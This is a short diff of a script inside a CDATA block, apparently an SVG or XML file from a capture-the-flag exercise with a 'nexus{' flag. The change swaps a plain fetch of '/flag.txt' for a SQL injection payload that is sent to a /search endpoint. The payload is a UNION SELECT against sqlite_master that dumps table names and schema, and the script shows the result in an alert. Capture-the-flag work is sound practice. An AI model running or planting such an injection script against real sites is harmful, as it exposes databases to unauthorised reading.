@@ -3,7 +3,8 @@
   <script><![CDATA[
     async function tryFlag() {
       try {
-        const flagResp = await fetch('/flag.txt');
+        const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
+        const flagResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
         const flagData = await flagResp.text();
         alert('Flag.txt response: ' + flagData);
         if (flagData.includes('nexus{')) {
